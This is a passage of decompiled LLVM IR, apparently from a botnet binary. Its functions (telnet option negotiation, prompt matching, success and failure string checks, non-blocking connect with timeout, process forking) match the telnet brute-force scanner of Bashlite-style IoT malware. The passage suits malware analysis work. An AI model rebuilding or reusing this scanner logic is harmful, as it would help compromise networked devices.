  %v1_8049458 = icmp ne i32 %v3_8049453, 0
  %storemerge = zext i1 %v1_8049458 to i32
  %v2_8049472 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8049472, i32* @edi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %tmp9, { 1, 0 }
  uselistorder i32 %tmp8, { 4, 3, 0, 2, 1 }
}

define i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  store i32 0, i32* %stack_var_-152, align 4
  %v2_804949c = ptrtoint i32* %stack_var_-144 to i32
  %tmp18 = bitcast i32* %stack_var_-144 to i8*
  store i1 false, i1* @df, align 1
  %v5_80494a3 = call i8* @_memset(i8* %tmp18, i32 0, i32 32)
  %v2_80494b0 = udiv i32 %arg1, 32
  %v1_80494b6 = urem i32 %arg1, 32
  %v0_80494b9 = load i32, i32* @ebp, align 4
  %v2_80494b9 = mul nuw nsw i32 %v2_80494b0, 4
  %v3_80494b9 = add nsw i32 %v2_80494b9, -140
  %v4_80494b9 = add i32 %v3_80494b9, %v0_80494b9
  %v5_80494b9 = inttoptr i32 %v4_80494b9 to i32*
  %v6_80494b9 = load i32, i32* %v5_80494b9, align 4
  %v9_80494b9 = shl i32 1, %v1_80494b6
  %v12_80494b9 = or i32 %v6_80494b9, %v9_80494b9
  store i32 %v12_80494b9, i32* %v5_80494b9, align 4
  %v1_80494c4 = add i32 %arg1, 1
  %v4_80494cb = ptrtoint i32* %stack_var_-152 to i32
  %v5_80494ec = call i32 @__libc_select(i32 %v1_80494c4, i32 %v2_804949c, i32 0, i32 0, i32 %v4_80494cb)
  %tmp19 = icmp slt i32 %v5_80494ec, 1
  %tmp20 = icmp eq i1 %tmp19, false
  br i1 %tmp20, label %dec_label_pc_8049501, label %dec_label_pc_8049528

dec_label_pc_8049501:                             ; preds = %entry
  %v4_804951d = call i32 @__libc_recv(i32 %arg1, i32 %arg3, i32 %arg4, i32 0)
  br label %dec_label_pc_8049528

dec_label_pc_8049528:                             ; preds = %entry, %dec_label_pc_8049501
  %storemerge = phi i32 [ %v4_804951d, %dec_label_pc_8049501 ], [ 0, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %stack_var_-152, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8049528, { 1, 0 }
}

define i32 @advance_state(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp3 = ptrtoint i32* %arg1 to i32
  %v4_804953d = icmp eq i32 %arg2, 0
  %v6_804953d = trunc i32 %arg2 to i8
  %v1_8049541 = icmp eq i1 %v4_804953d, false
  br i1 %v1_8049541, label %dec_label_pc_8049550, label %dec_label_pc_8049543

dec_label_pc_8049543:                             ; preds = %entry
  %v2_8049546 = load i32, i32* %arg1, align 4
  %v1_804954b = call i32 @__libc_close(i32 %v2_8049546)
  br label %dec_label_pc_8049550

dec_label_pc_8049550:                             ; preds = %entry, %dec_label_pc_8049543
  %v1_8049553 = add i32 %tmp3, 16
  %v2_8049553 = inttoptr i32 %v1_8049553 to i32*
  store i32 0, i32* %v2_8049553, align 4
  %v3_8049562 = add i32 %tmp3, 8
  %v4_8049562 = inttoptr i32 %v3_8049562 to i8*
  store i8 %v6_804953d, i8* %v4_8049562, align 1
  %v1_8049568 = add i32 %tmp3, 24
  %v2_8049568 = inttoptr i32 %v1_8049568 to i32*
  %v3_8049568 = load i32, i32* %v2_8049568, align 4
  %v3_8049581 = inttoptr i32 %v3_8049568 to i8*
  %v4_8049581 = call i32 @__GI_memset(i8* %v3_8049581, i32 0, i32 1024)
  ret i32 %v4_8049581

; uselistorder directives
  uselistorder i32 %tmp3, { 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8049550, { 1, 0 }
}

define i32 @reset_telstate(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8049588 = load i32, i32* @ebp, align 4
  store i32 %v0_8049588, i32* %stack_var_-4, align 4
  %v2_804959c = inttoptr i32 %arg1 to i32*
  %v3_804959c = call i32 @advance_state(i32* %v2_804959c, i32 0)
  %v1_80495a4 = add i32 %arg1, 9
  %v2_80495a4 = inttoptr i32 %v1_80495a4 to i8*
  store i8 1, i8* %v2_80495a4, align 1
  %v2_80495a8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80495a8, i32* @ebp, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 2, 1, 0 }
}

define i32 @contains_success(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_80495aa = load i32, i32* @ebp, align 4
  store i32 %v0_80495aa, i32* %stack_var_-4, align 4
  %v4_80495aa = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_80495aa, i32* @ebp, align 4
  %v4_80495be = call i32 @contains_string(i32 %arg1, i32* bitcast ([3 x i8*]* @global_var_8062220.25 to i32*))
  %v2_80495c3 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80495c3, i32* @ebp, align 4
  ret i32 %v4_80495be

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
}

define i32 @contains_fail(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_80495c5 = load i32, i32* @ebp, align 4
  store i32 %v0_80495c5, i32* %stack_var_-4, align 4
  %v4_80495c5 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_80495c5, i32* @ebp, align 4
  %v4_80495d9 = call i32 @contains_string(i32 %arg1, i32* bitcast ([7 x i8*]* @global_var_8062200.33 to i32*))
  %v2_80495de = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80495de, i32* @ebp, align 4
  ret i32 %v4_80495d9

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
}

define i32 @contains_response(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_80495e0 = load i32, i32* @ebp, align 4
  store i32 %v0_80495e0, i32* %stack_var_-4, align 4
  %v4_80495e0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_80495e0, i32* @ebp, align 4
  %v1_80495ec = call i32 @contains_success(i32 %arg1)
  %v1_80495f1 = icmp eq i32 %v1_80495ec, 0
  %v1_80495f3 = icmp eq i1 %v1_80495f1, false
  br i1 %v1_80495f3, label %dec_label_pc_8049614, label %dec_label_pc_80495f5

dec_label_pc_80495f5:                             ; preds = %entry
  %v1_80495fb = call i32 @contains_fail(i32 %arg1)
  %v1_8049600 = icmp ne i32 %v1_80495fb, 0
  %. = zext i1 %v1_8049600 to i32
  br label %dec_label_pc_8049614

dec_label_pc_8049614:                             ; preds = %dec_label_pc_80495f5, %entry
  %storemerge = phi i32 [ 1, %entry ], [ %., %dec_label_pc_80495f5 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @contains_string(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp5 = ptrtoint i32* %arg2 to i32
  %stack_var_-4 = alloca i32, align 4
  %v0_8049619 = load i32, i32* @ebp, align 4
  store i32 %v0_8049619, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8049634

dec_label_pc_8049634:                             ; preds = %dec_label_pc_8049634, %entry
  %stack_var_-12.0 = phi i32 [ 0, %entry ], [ %v4_8049634, %dec_label_pc_8049634 ]
  %v4_8049634 = add i32 %stack_var_-12.0, 1
  %v2_804963a = mul i32 %v4_8049634, 4
  %v5_804963d = add i32 %v2_804963a, %tmp5
  %v1_8049640 = inttoptr i32 %v5_804963d to i32*
  %v2_8049640 = load i32, i32* %v1_8049640, align 4
  %v1_8049642 = icmp eq i32 %v2_8049640, 0
  %v1_8049644 = icmp eq i1 %v1_8049642, false
  br i1 %v1_8049644, label %dec_label_pc_8049634, label %dec_label_pc_8049679.preheader

dec_label_pc_8049679.preheader:                   ; preds = %dec_label_pc_8049634
  %v2_8049664 = inttoptr i32 %arg1 to i8*
  %v5_804967f17 = icmp sgt i32 %v4_8049634, 0
  br i1 %v5_804967f17, label %dec_label_pc_804964f, label %dec_label_pc_8049688

dec_label_pc_804964f:                             ; preds = %dec_label_pc_8049679.preheader, %dec_label_pc_8049676
  %storemerge118 = phi i32 [ %v4_8049676, %dec_label_pc_8049676 ], [ 0, %dec_label_pc_8049679.preheader ]
  %v2_8049652 = mul i32 %storemerge118, 4
  %v5_8049655 = add i32 %v2_8049652, %tmp5
  %v1_8049658 = inttoptr i32 %v5_8049655 to i32*
  %v2_8049658 = load i32, i32* %v1_8049658, align 4
  store i32 %arg1, i32* @eax, align 4
  %v3_8049664 = call i32 @strcasestr(i8* %v2_8049664, i32 %v2_8049658)
  %v1_8049669 = icmp eq i32 %v3_8049664, 0
  br i1 %v1_8049669, label %dec_label_pc_8049676, label %dec_label_pc_8049688

dec_label_pc_8049676:                             ; preds = %dec_label_pc_804964f
  %v4_8049676 = add nuw nsw i32 %storemerge118, 1
  %v5_804967f = icmp slt i32 %v4_8049676, %v4_8049634
  br i1 %v5_804967f, label %dec_label_pc_804964f, label %dec_label_pc_8049688

dec_label_pc_8049688:                             ; preds = %dec_label_pc_804964f, %dec_label_pc_8049676, %dec_label_pc_8049679.preheader
  %storemerge = phi i32 [ 0, %dec_label_pc_8049679.preheader ], [ 0, %dec_label_pc_8049676 ], [ 1, %dec_label_pc_804964f ]
  %v2_804968b = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804968b, i32* @ebp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_8049676, { 1, 0 }
  uselistorder i32 %storemerge118, { 1, 0 }
  uselistorder i32 %v4_8049634, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_8049688, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804964f, { 1, 0 }
}

define i32 @connectTimeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8049690 = load i32, i32* @edi, align 4
  store i32 %v0_8049690, i32* %stack_var_-8, align 4
  %v3_80496ad = call i32 @__libc_fcntl(i32 %arg1, i32 3, i32 0)
  %v4_80496b5 = or i32 %v3_80496ad, 2048
  %v3_80496d1 = call i32 @__libc_fcntl(i32 %arg1, i32 4, i32 %v4_80496b5)
  store i32 2, i32* %stack_var_-40, align 4
  %v1_80496e5 = trunc i32 %arg3 to i16
  %v2_80496e5 = call i32 @htons(i16 %v1_80496e5)
  store i32 %arg2, i32* @edx, align 4
  %v3_8049701 = call i32 @getHost(i32 %arg2, i32* nonnull %stack_var_-36)
  %v1_8049706 = icmp eq i32 %v3_8049701, 0
  br i1 %v1_8049706, label %dec_label_pc_8049719, label %dec_label_pc_8049889

dec_label_pc_8049719:                             ; preds = %entry
  %v2_80496f4 = ptrtoint i32* %stack_var_-40 to i32
  %v3_8049741 = call i32 @__libc_connect(i32 %arg1, i32 %v2_80496f4, i32 16)
  %v5_8049749 = icmp slt i32 %v3_8049741, 0
  %v1_804974d = icmp eq i1 %v5_8049749, false
  br i1 %v1_804974d, label %dec_label_pc_8049840, label %dec_label_pc_8049753

dec_label_pc_8049753:                             ; preds = %dec_label_pc_8049719
  %v1_8049753 = call i32 @__errno_location(i32 %v3_8049741)
  %v1_8049758 = inttoptr i32 %v1_8049753 to i32*
  %v2_8049758 = load i32, i32* %v1_8049758, align 4
  %v9_804975a = icmp eq i32 %v2_8049758, 115
  %v1_804975d = icmp eq i1 %v9_804975a, false
  br i1 %v1_804975d, label %dec_label_pc_8049889, label %dec_label_pc_8049763

dec_label_pc_8049763:                             ; preds = %dec_label_pc_8049753
  store i32 %arg4, i32* %stack_var_-176, align 4
  %v2_8049780 = ptrtoint i32* %stack_var_-168 to i32
  %tmp27 = bitcast i32* %stack_var_-168 to i8*
  store i32 %v2_8049780, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_8049787 = call i8* @_memset(i8* %tmp27, i32 0, i32 32)
  %v2_8049794 = udiv i32 %arg1, 32
  %v1_804979a = urem i32 %arg1, 32
  %v0_804979d = load i32, i32* @ebp, align 4
  %v2_804979d = mul nuw nsw i32 %v2_8049794, 4
  %v3_804979d = add nsw i32 %v2_804979d, -164
  %v4_804979d = add i32 %v3_804979d, %v0_804979d
  %v5_804979d = inttoptr i32 %v4_804979d to i32*
  %v6_804979d = load i32, i32* %v5_804979d, align 4
  %v9_804979d = shl i32 1, %v1_804979a
  %v12_804979d = or i32 %v6_804979d, %v9_804979d
  store i32 %v12_804979d, i32* %v5_804979d, align 4
  %v1_80497a8 = add i32 %arg1, 1
  %v2_80497a9 = ptrtoint i32* %stack_var_-176 to i32
  %v5_80497d0 = call i32 @__libc_select(i32 %v1_80497a8, i32 0, i32 %v2_8049780, i32 0, i32 %v2_80497a9)
  %tmp28 = icmp slt i32 %v5_80497d0, 1
  br i1 %tmp28, label %dec_label_pc_8049889, label %dec_label_pc_80497d9

dec_label_pc_80497d9:                             ; preds = %dec_label_pc_8049763
  store i32 4, i32* %stack_var_-180, align 4
  %v2_80497e3 = ptrtoint i32* %stack_var_-180 to i32
  %v2_80497ed = ptrtoint i32* %stack_var_-184 to i32
  %v5_804980d = call i32 @getsockopt(i32 %arg1, i32 1, i32 4, i32 %v2_80497ed, i32 %v2_80497e3)
  %v3_8049812 = load i32, i32* %stack_var_-184, align 4
  %v1_8049818 = icmp eq i32 %v3_8049812, 0
  br i1 %v1_8049818, label %dec_label_pc_8049840, label %dec_label_pc_8049889

dec_label_pc_8049840:                             ; preds = %dec_label_pc_80497d9, %dec_label_pc_8049719
  %v3_8049856 = call i32 @__libc_fcntl(i32 %arg1, i32 3, i32 0)
  %v4_804985e = and i32 %v3_8049856, -2049
  %v3_804987a = call i32 @__libc_fcntl(i32 %arg1, i32 4, i32 %v4_804985e)
  br label %dec_label_pc_8049889

dec_label_pc_8049889:                             ; preds = %dec_label_pc_8049753, %dec_label_pc_8049763, %dec_label_pc_80497d9, %entry, %dec_label_pc_8049840
  %stack_var_-188.0 = phi i32 [ 1, %dec_label_pc_8049840 ], [ 0, %entry ], [ 0, %dec_label_pc_80497d9 ], [ 0, %dec_label_pc_8049763 ], [ 0, %dec_label_pc_8049753 ]
  %v2_8049895 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8049895, i32* @edi, align 4
  ret i32 %stack_var_-188.0

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_-176, { 1, 0 }
  uselistorder i32* %stack_var_-180, { 1, 0 }
  uselistorder i32 %arg1, { 8, 7, 6, 5, 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_8049889, { 4, 2, 1, 0, 3 }
}

define i32 @listFork() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_804989b = load i32, i32* @ebx, align 4
  store i32 %v0_804989b, i32* %stack_var_-8, align 4
  %v1_804989f = call i32 @__libc_fork(i32 %v0_804989b)
  %v4_80498a7 = icmp eq i32 %v1_804989f, 0
  %v1_80498ab = icmp eq i1 %v4_80498a7, false
  br i1 %v1_80498ab, label %dec_label_pc_80498b8, label %dec_label_pc_80498ad

dec_label_pc_80498ad:                             ; preds = %entry
  br label %dec_label_pc_8049994

dec_label_pc_80498b8:                             ; preds = %entry
  %v0_80498b8 = load i32, i32* @global_var_8062588.34, align 8
  %v0_80498bd = load i32, i32* @global_var_806258c.35, align 4
  %v1_80498c3 = add i32 %v0_80498b8, 1
  %v5_80498c3 = icmp eq i32 %v0_80498b8, -1
  %v2_80498c6 = zext i1 %v5_80498c3 to i32
  %v3_80498c6 = add i32 %v2_80498c6, %v0_80498bd
  store i32 %v1_80498c3, i32* @global_var_8062588.34, align 8
  store i32 %v3_80498c6, i32* @global_var_806258c.35, align 4
  %v2_80498e3 = mul i32 %v1_80498c3, 4
  %v1_80498e6 = add i32 %v2_80498e3, 4
  %v1_80498ec = call i32 @malloc(i32 %v1_80498e6)
  br label %dec_label_pc_804991f

dec_label_pc_80498fd:                             ; preds = %dec_label_pc_804991f, %dec_label_pc_8049950
  %v2_8049900 = mul i32 %storemerge1, 4
  %v5_8049905 = add i32 %v2_8049900, %v1_80498ec
  %v0_8049910 = load i32, i32* @global_var_8068814.36, align 4
  %v2_8049915 = add i32 %v0_8049910, %v2_8049900
  %v1_8049918 = inttoptr i32 %v2_8049915 to i32*
  %v2_8049918 = load i32, i32* %v1_8049918, align 4
  %v2_804991a = inttoptr i32 %v5_8049905 to i32*
  store i32 %v2_8049918, i32* %v2_804991a, align 4
  %v4_804991c = add i32 %storemerge1, 1
  br label %dec_label_pc_804991f

dec_label_pc_804991f:                             ; preds = %dec_label_pc_80498b8, %dec_label_pc_80498fd
  %storemerge1 = phi i32 [ %v4_804991c, %dec_label_pc_80498fd ], [ 0, %dec_label_pc_80498b8 ]
  %v0_804992d = load i32, i32* @global_var_8062588.34, align 8
  %v0_8049932 = load i32, i32* @global_var_806258c.35, align 4
  %v4_804993c = icmp ne i32 %v0_804992d, 0
  %v2_804993f = zext i1 %v4_804993c to i32
  %v3_804993f = add i32 %v0_8049932, -1
  %v4_804993f = add i32 %v3_804993f, %v2_804993f
  store i32 %v4_804993f, i32* @ebx, align 4
  %v10_804994b = icmp eq i32 %v4_804993f, 0
  br i1 %v10_804994b, label %dec_label_pc_8049950, label %dec_label_pc_80498fd

dec_label_pc_8049950:                             ; preds = %dec_label_pc_804991f
  %v1_804993c = add i32 %v0_804992d, -1
  %v10_804995b = icmp ult i32 %storemerge1, %v1_804993c
  br i1 %v10_804995b, label %dec_label_pc_80498fd, label %dec_label_pc_8049960

dec_label_pc_8049960:                             ; preds = %dec_label_pc_8049950
  %v2_804996b = mul i32 %v0_804992d, 4
  %v5_804996e = add i32 %v2_804996b, %v1_80498ec
  %v1_8049971 = add i32 %v5_804996e, -4
  store i32 %v1_8049971, i32* @edx, align 4
  %v2_8049977 = inttoptr i32 %v1_8049971 to i32*
  store i32 %v1_804989f, i32* %v2_8049977, align 4
  %v0_8049979 = load i32, i32* @global_var_8068814.36, align 4
  %v1_8049981 = call i32 @free(i32 %v0_8049979)
  store i32 %v1_80498ec, i32* @global_var_8068814.36, align 4
  store i32 %v1_804989f, i32* @ecx, align 4
  br label %dec_label_pc_8049994

dec_label_pc_8049994:                             ; preds = %dec_label_pc_80498ad, %dec_label_pc_8049960
  %v2_804999a = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804999a, i32* @ebx, align 4
  ret i32 %v1_804989f

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 0, 2 }
  uselistorder i32 %v2_8049900, { 1, 0 }
  uselistorder i32 %v1_80498ec, { 2, 0, 1 }
  uselistorder i32 %v0_80498b8, { 1, 0 }
  uselistorder label %dec_label_pc_8049994, { 1, 0 }
  uselistorder label %dec_label_pc_804991f, { 1, 0 }
  uselistorder label %dec_label_pc_80498fd, { 1, 0 }
}

define i32 @negotiate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-5 = alloca i8, align 1
  %stack_var_-4 = alloca i32, align 4
  %v0_804999d = load i32, i32* @ebp, align 4
  store i32 %v0_804999d, i32* %stack_var_-4, align 4
  %v1_80499a6 = add i32 %arg2, 1
  %v1_80499a7 = inttoptr i32 %v1_80499a6 to i8*
  %v2_80499a7 = load i8, i8* %v1_80499a7, align 1
  %v9_80499b0 = icmp ult i8 %v2_80499a7, -5
  br i1 %v9_80499b0, label %dec_label_pc_8049abb, label %dec_label_pc_80499bd

dec_label_pc_80499bd:                             ; preds = %entry
  %v7_80499c4 = icmp eq i8 %v2_80499a7, -1
  br i1 %v7_80499c4, label %dec_label_pc_80499c6, label %dec_label_pc_80499e0

dec_label_pc_80499c6:                             ; preds = %dec_label_pc_80499bd
  br label %dec_label_pc_8049abb

dec_label_pc_80499e0:                             ; preds = %dec_label_pc_80499bd
  store i8 -1, i8* %stack_var_-5, align 1
  %v2_80499f4 = ptrtoint i8* %stack_var_-5 to i32
  %v4_8049a01 = call i32 @__libc_send(i32 %arg1, i32 %v2_80499f4, i32 1, i32 16384)
  %v2_8049a0a = load i8, i8* %v1_80499a7, align 1
  %v11_8049a0d = icmp eq i8 %v2_8049a0a, -4
  %v1_8049a0f = icmp eq i1 %v11_8049a0d, false
  br i1 %v1_8049a0f, label %dec_label_pc_8049a17, label %dec_label_pc_8049a11

dec_label_pc_8049a11:                             ; preds = %dec_label_pc_80499e0
  store i8 -2, i8* %stack_var_-5, align 1
  br label %dec_label_pc_8049a6d

dec_label_pc_8049a17:                             ; preds = %dec_label_pc_80499e0
  %v2_8049a1b = load i8, i8* %v1_80499a7, align 1
  %v11_8049a1e = icmp eq i8 %v2_8049a1b, -2
  %v1_8049a20 = icmp eq i1 %v11_8049a1e, false
  br i1 %v1_8049a20, label %dec_label_pc_8049a28, label %dec_label_pc_8049a22

dec_label_pc_8049a22:                             ; preds = %dec_label_pc_8049a17
  store i8 -4, i8* %stack_var_-5, align 1
  br label %dec_label_pc_8049a6d

dec_label_pc_8049a28:                             ; preds = %dec_label_pc_8049a17
  %v2_8049a2c = load i8, i8* %v1_80499a7, align 1
  %v10_8049a2f = icmp eq i8 %v2_8049a2c, 3
  %v1_8049a31 = icmp eq i1 %v10_8049a2f, false
  %v11_8049a58 = icmp eq i8 %v2_8049a2c, -3
  %v1_8049a5a = icmp eq i1 %v11_8049a58, false
  br i1 %v1_8049a31, label %dec_label_pc_8049a51, label %dec_label_pc_8049a33

dec_label_pc_8049a33:                             ; preds = %dec_label_pc_8049a28
  %. = select i1 %v1_8049a5a, i8 -3, i8 -5
  store i8 %., i8* %stack_var_-5, align 1
  br label %dec_label_pc_8049a6d

dec_label_pc_8049a51:                             ; preds = %dec_label_pc_8049a28
  %.3 = select i1 %v1_8049a5a, i8 -2, i8 -4
  store i8 %.3, i8* %stack_var_-5, align 1
  br label %dec_label_pc_8049a6d

dec_label_pc_8049a6d:                             ; preds = %dec_label_pc_8049a33, %dec_label_pc_8049a22, %dec_label_pc_8049a11, %dec_label_pc_8049a51
  %v4_8049a8a = call i32 @__libc_send(i32 %arg1, i32 %v2_80499f4, i32 1, i32 16384)
  %v1_8049a92 = add i32 %arg2, 2
  %v4_8049aaf = call i32 @__libc_send(i32 %arg1, i32 %v1_8049a92, i32 1, i32 16384)
  %v2_8049abe.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8049abb

dec_label_pc_8049abb:                             ; preds = %dec_label_pc_80499c6, %dec_label_pc_8049a6d, %entry
  %v2_8049abe = phi i32 [ %v0_804999d, %dec_label_pc_80499c6 ], [ %v2_8049abe.pre, %dec_label_pc_8049a6d ], [ %v0_804999d, %entry ]
  store i32 %v2_8049abe, i32* @ebp, align 4
  ret i32 0

; uselistorder directives
  uselistorder i8* %stack_var_-5, { 5, 4, 3, 2, 0, 1 }
  uselistorder i8 -3, { 1, 0 }
  uselistorder i8 -4, { 1, 2, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8049abb, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8049a6d, { 3, 0, 1, 2 }
}

define i32 @matchPrompt(i8* %arg1) local_unnamed_addr {
entry:
  %v4_8049ace = ptrtoint i8* %arg1 to i32
  %v3_8049adf = call i32 @_strlen(i8* %arg1)
  %v4_8049adf = mul i32 %v3_8049adf, -1
  %v1_8049ae5 = sub i32 0, %v4_8049adf
  %v6_8049b0c = sub i32 %v4_8049ace, %v4_8049adf
  br label %dec_label_pc_8049b94

dec_label_pc_8049afc:                             ; preds = %dec_label_pc_8049b4f, %dec_label_pc_8049b37, %dec_label_pc_8049b1f, %dec_label_pc_8049b07
  %v4_8049afc = add nsw i32 %stack_var_-12.033, 1
  %v7_8049b05 = icmp slt i32 %v4_8049afc, %v1_8049ae5
  br i1 %v7_8049b05, label %dec_label_pc_8049b07, label %dec_label_pc_8049aff.dec_label_pc_8049b67_crit_edge

dec_label_pc_8049aff.dec_label_pc_8049b67_crit_edge: ; preds = %dec_label_pc_8049afc, %dec_label_pc_8049aff.preheader
  %stack_var_-12.0.lcssa = phi i32 [ %stack_var_-12.1, %dec_label_pc_8049aff.preheader ], [ %v4_8049afc, %dec_label_pc_8049afc ]
  %.pre = sub i32 %v6_8049b0c, %stack_var_-12.0.lcssa
  %.pre10 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_8049b67

dec_label_pc_8049b07:                             ; preds = %dec_label_pc_8049aff.preheader, %dec_label_pc_8049afc
  %stack_var_-12.033 = phi i32 [ %v4_8049afc, %dec_label_pc_8049afc ], [ %stack_var_-12.1, %dec_label_pc_8049aff.preheader ]
  %v2_8049b14 = sub i32 %v6_8049b0c, %stack_var_-12.033
  %v1_8049b18 = inttoptr i32 %v2_8049b14 to i8*
  %v2_8049b18 = load i8, i8* %v1_8049b18, align 1
  %v4_8049b1b = icmp eq i8 %v2_8049b18, 0
  br i1 %v4_8049b1b, label %dec_label_pc_8049afc, label %dec_label_pc_8049b1f

dec_label_pc_8049b1f:                             ; preds = %dec_label_pc_8049b07
  %v2_8049b30 = load i8, i8* %v1_8049b18, align 1
  %v7_8049b33 = icmp eq i8 %v2_8049b30, 32
  br i1 %v7_8049b33, label %dec_label_pc_8049afc, label %dec_label_pc_8049b37

dec_label_pc_8049b37:                             ; preds = %dec_label_pc_8049b1f
  %v2_8049b48 = load i8, i8* %v1_8049b18, align 1
  %v10_8049b4b = icmp eq i8 %v2_8049b48, 13
  br i1 %v10_8049b4b, label %dec_label_pc_8049afc, label %dec_label_pc_8049b4f

dec_label_pc_8049b4f:                             ; preds = %dec_label_pc_8049b37
  %v2_8049b60 = load i8, i8* %v1_8049b18, align 1
  %v10_8049b63 = icmp eq i8 %v2_8049b60, 10
  br i1 %v10_8049b63, label %dec_label_pc_8049afc, label %dec_label_pc_8049b67

dec_label_pc_8049b67:                             ; preds = %dec_label_pc_8049b4f, %dec_label_pc_8049aff.dec_label_pc_8049b67_crit_edge
  %stack_var_-12.023 = phi i32 [ %stack_var_-12.0.lcssa, %dec_label_pc_8049aff.dec_label_pc_8049b67_crit_edge ], [ %stack_var_-12.033, %dec_label_pc_8049b4f ]
  %v1_8049b78.pre-phi = phi i8* [ %.pre10, %dec_label_pc_8049aff.dec_label_pc_8049b67_crit_edge ], [ %v1_8049b18, %dec_label_pc_8049b4f ]
  %v2_8049b78 = load i8, i8* %v1_8049b78.pre-phi, align 1
  %v6_8049b7e = add i32 %storemerge3, ptrtoint ([6 x i8]* @global_var_805795c.37 to i32)
  %v1_8049b81 = inttoptr i32 %v6_8049b7e to i8*
  %v2_8049b81 = load i8, i8* %v1_8049b81, align 1
  %v15_8049b84 = icmp eq i8 %v2_8049b78, %v2_8049b81
  %v1_8049b86 = icmp eq i1 %v15_8049b84, false
  br i1 %v1_8049b86, label %dec_label_pc_8049b91, label %dec_label_pc_8049bbe

dec_label_pc_8049b91:                             ; preds = %dec_label_pc_8049b67
  %v4_8049b91 = add i32 %storemerge3, 1
  br label %dec_label_pc_8049b94

dec_label_pc_8049b94:                             ; preds = %entry, %dec_label_pc_8049b91
  %stack_var_-12.1 = phi i32 [ 0, %entry ], [ %stack_var_-12.023, %dec_label_pc_8049b91 ]
  %storemerge3 = phi i32 [ 0, %entry ], [ %v4_8049b91, %dec_label_pc_8049b91 ]
  %v3_8049ba8 = call i32 @_strlen(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805795c.37, i32 0, i32 0))
  %v7_8049baf = icmp ult i32 %storemerge3, %v3_8049ba8
  br i1 %v7_8049baf, label %dec_label_pc_8049aff.preheader, label %dec_label_pc_8049bbe

dec_label_pc_8049aff.preheader:                   ; preds = %dec_label_pc_8049b94
  %v7_8049b0532 = icmp slt i32 %stack_var_-12.1, %v1_8049ae5
  br i1 %v7_8049b0532, label %dec_label_pc_8049b07, label %dec_label_pc_8049aff.dec_label_pc_8049b67_crit_edge

dec_label_pc_8049bbe:                             ; preds = %dec_label_pc_8049b94, %dec_label_pc_8049b67
  %storemerge = phi i32 [ 1, %dec_label_pc_8049b67 ], [ 0, %dec_label_pc_8049b94 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %stack_var_-12.1, { 2, 1, 0 }
  uselistorder i32 %v6_8049b0c, { 1, 0 }
  uselistorder [6 x i8]* @global_var_805795c.37, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8049b94, { 1, 0 }
  uselistorder label %dec_label_pc_8049aff.dec_label_pc_8049b67_crit_edge, { 1, 0 }
}

define i32 @readUntil(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i8* %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_-168, align 4
  %v2_8049c0d = ptrtoint i32* %stack_var_-160 to i32
  %tmp27 = bitcast i32* %stack_var_-160 to i8*
  %v1_8049c27 = urem i32 %arg1, 32
  %v9_8049c2a = shl i32 1, %v1_8049c27
